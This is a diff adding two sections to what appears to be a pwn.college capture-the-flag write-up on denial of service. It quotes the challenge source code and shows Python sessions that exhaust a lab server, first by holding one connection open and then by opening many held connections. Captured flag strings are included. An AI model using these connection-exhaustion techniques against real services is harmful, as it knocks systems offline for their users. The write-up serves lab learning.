@@ -861,9 +861,203 @@ pwn.college{8T7GpLSG0UQsqNItYdCt1AztxCN.QXwUDM2EDL4ITM0EzW}
 
 ## Denial of Service 1
 
+> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.
+
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import os
+import socket
+import time
+
+import psutil
+from dojjail import Host, Network
+from dojjail.capabilities import limit_capabilities
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        server_socket = socket.socket()
+        server_socket.bind(("0.0.0.0", 31337))
+        server_socket.listen(1)
+        while True:
+            try:
+                connection, _ = server_socket.accept()
+                connection.recv(1024)
+                connection.close()
+            except ConnectionError:
+                continue
+
+class ClientHost(Host):
+    def entrypoint(self):
+        while True:
+            time.sleep(1)
+            try:
+                with socket.create_connection(("10.0.0.2", 31337), timeout=1) as client_socket:
+                    client_socket.sendall(b"Hello, World!\n")
+            except (TimeoutError, socket.timeout):
+                print(flag, flush=True)
+                break
+            except (OSError, ConnectionError):
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+server_host = ServerHost("ip-10-0-0-2")
+client_host = ClientHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
+                  subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
+```
+
+Client keeps trying to connect to `10.0.0.2:31337`. 
+If the server stops responding (e.g., due to DoS), the client hits a timeout.
+On timeout, the client prints the flag and breaks out of the loop.
+
+We have to bombard the server so that it does not respond to the client, and we get a flag.
+
+```py
+In [1]: import socket
+   ...: s = socket.create_connection(("10.0.0.2", 31337))
+   ...: input("DoSing server...\n")
+DoSing server...
+pwn.college{YEX2Ry1o2FmWPH-DALp2yFdHjNO.QX3UDM2EDL4ITM0EzW}
+```
+
 &nbsp;
 
 ## Denial of Service 2
+
+> The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.
+>
+> This time the server forks a new process for each client connection.
+
+### Source code
+```py title="/challenge/run showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import os
+import socket
+import socketserver
+import time
+
+import psutil
+from dojjail import Host, Network
+from dojjail.capabilities import limit_capabilities
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        class ForkingTCPHandler(socketserver.BaseRequestHandler):
+            def handle(self):
+                self.request.recv(1024)
+
+        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
+            server.serve_forever()
+
+class ClientHost(Host):
+    def entrypoint(self):
+        while True:
+            try:
+                with socket.create_connection(("10.0.0.2", 31337), timeout=1) as client_socket:
+                    client_socket.sendall(b"Hello, World!\n")
+                time.sleep(1)
+            except (TimeoutError, socket.timeout):
+                print(flag, flush=True)
+                break
+            except (OSError, ConnectionError) as e:
+                print(type(e), e, flush=True)
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+server_host = ServerHost("ip-10-0-0-2")
+client_host = ClientHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
+                  subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
+```
+
+This time the server forks and spawns a new process per connection. Thus, we cannot do Dos by just holding a simgle connection open anymore.
+
+We will have to send multiple connections to the server so that it does not respond to the client. This will cause the client to time out and print the flag.
+
+Let's start with `100` connections.
+
+```py
+In [1]: import socket
+   ...: import time
+   ...: 
+   ...: target = ("10.0.0.2", 31337)
+   ...: sockets = []
+   ...: 
+   ...: for i in range(100):
+   ...:     try:
+   ...:         s = socket.create_connection(target, timeout=1)
+   ...:         sockets.append(s)
+   ...:         print(f"Held {i} connections")
+   ...:         time.sleep(0.05)
+   ...:     except Exception as e:
+   ...:         print("Error:", e)
+   ...:         break
+   ...: 
+   ...: input("Holding connections open...\n")
+Held 0 connections
+Held 1 connections
+Held 2 connections
+Held 3 connections
+Held 4 connections
+Held 5 connections
+Held 6 connections
+Held 7 connections
+Held 8 connections
+Held 9 connections
+Held 10 connections
+Held 11 connections
+Held 12 connections
+Held 13 connections
+Held 14 connections
+Held 15 connections
+Held 16 connections
+Held 17 connections
+Held 18 connections
+Held 19 connections
+Held 20 connections
+Held 21 connections
+Held 22 connections
+Held 23 connections
+Held 24 connections
+Held 25 connections
+Held 26 connections
+Held 27 connections
+Held 28 connections
+Held 29 connections
+Held 30 connections
+Held 31 connections
+Held 32 connections
+Held 33 connections
+Held 34 connections
+Held 35 connections
+Held 36 connections
+Held 37 connections
+Held 38 connections
+Held 39 connections
+Held 40 connections
+Held 41 connections
+Held 42 connections
+Held 43 connections
+Held 44 connections
+Error: timed out
+Holding connections open...
+pwn.college{UYk-vC_7sk20Ga1gEsbb-_0T0BP.QX4UDM2EDL4ITM0EzW}
+```
 
 &nbsp;
 
